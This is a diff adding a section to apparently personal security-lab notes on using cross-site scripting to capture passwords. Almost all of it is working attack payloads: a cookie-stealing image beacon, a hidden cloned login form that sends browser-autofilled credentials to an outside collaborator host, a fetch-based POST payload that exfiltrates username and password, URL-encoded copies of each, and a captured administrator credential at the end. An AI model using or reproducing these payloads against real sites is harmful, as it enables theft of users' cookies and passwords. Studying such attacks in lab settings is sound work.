@@ -401,3 +401,52 @@ commentBodyPElement.innerHTML: '&lt;&gt;<audio src="" onerror="alert(1)"></audio
 // this extra set of angle brackets will be encoded, 
 // but any subsequent angle brackets will be unaffected
 ```
+
+### Exploiting cross-site scripting to capture passwords [sauce](https://www.doyler.net/security-not-included/xss-password-stealing)
+```js
+// classic payload (for cookies)
+
+<script>var i=new Image;i.src="https://k1m6vuvjntnvf9u8pap2pxvi69c00soh.oastify.com/?url="+document.cookie;</script>
+
+// that didn't work, and it's not "cookie" that's needed..
+// from online:
+
+</body>
+<body onload='stealCreds();'>
+<div style="opacity:0;">
+  <form>
+    <input type="text" name="username" id="username" />
+    <input type="password" name="password" id="password" />
+  </form>
+  <script>
+    function stealCreds(){
+      var user = document.getElementById('username').value;
+      var pass = document.getElementById('password').value;
+      new Image().src="https://c5iyzmzbrlrnj1y0t2tutpzaa1gs4lsa.oastify.com?u=" + user + "&p=" + pass;
+    }
+  </script>
+</div>
+
+// explanation:
+// if our victim has credentials saved in their browser, then we can steal them with XSS.
+// First, we need a duplicated copy of the login form (for the browser to auto-populate). 
+// Other than that, we just need a JavaScript function to actually grab the credentials and send them back to us.
+
+// URL-encode the entire thing (cyberchef)
+%3C%2Fbody%3E%0A%3Cbody%20onload%3D%27stealCreds%28%29%3B%27%3E%0A%3Cdiv%20style%3D%22opacity%3A0%3B%22%3E%0A%20%20%3Cform%3E%0A%20%20%20%20%3Cinput%20type%3D%22text%22%20name%3D%22username%22%20id%3D%22username%22%20%2F%3E%0A%20%20%20%20%3Cinput%20type%3D%22password%22%20name%3D%22password%22%20id%3D%22password%22%20%2F%3E%0A%20%20%3C%2Fform%3E%0A%20%20%3Cscript%3E%0A%20%20%20%20function%20stealCreds%28%29%7B%0A%20%20%20%20%20%20var%20user%20%3D%20document%2EgetElementById%28%27username%27%29%2Evalue%3B%0A%20%20%20%20%20%20var%20pass%20%3D%20document%2EgetElementById%28%27password%27%29%2Evalue%3B%0A%20%20%20%20%20%20new%20Image%28%29%2Esrc%3D%22http%3A%2F%2F10%2E0%2E2%2E15%2Flogin%3Fu%3D%22%20%2B%20user%20%2B%20%22%26p%3D%22%20%2B%20pass%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fscript%3E%0A%3C%2Fdiv%3E
+
+// that didn't work - more efficient solution here:
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://hvg3prpghqhs96o5j7jzjupf066xuuij.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
+// URL-encode: (cyberchef)
+%3Cinput%20name%3Dusername%20id%3Dusername%3E%0A%3Cinput%20type%3Dpassword%20name%3Dpassword%20onchange%3D%22if%28this%2Evalue%2Elength%29fetch%28%27https%3A%2F%2Fhvg3prpghqhs96o5j7jzjupf066xuuij%2Eoastify%2Ecom%27%2C%7B%0Amethod%3A%27POST%27%2C%0Amode%3A%20%27no%2Dcors%27%2C%0Abody%3Ausername%2Evalue%2B%27%3A%27%2Bthis%2Evalue%0A%7D%29%3B%22%3E
+
+// this really worked:
+administrator:bjo7ffw73xe3wh0533g0
+```
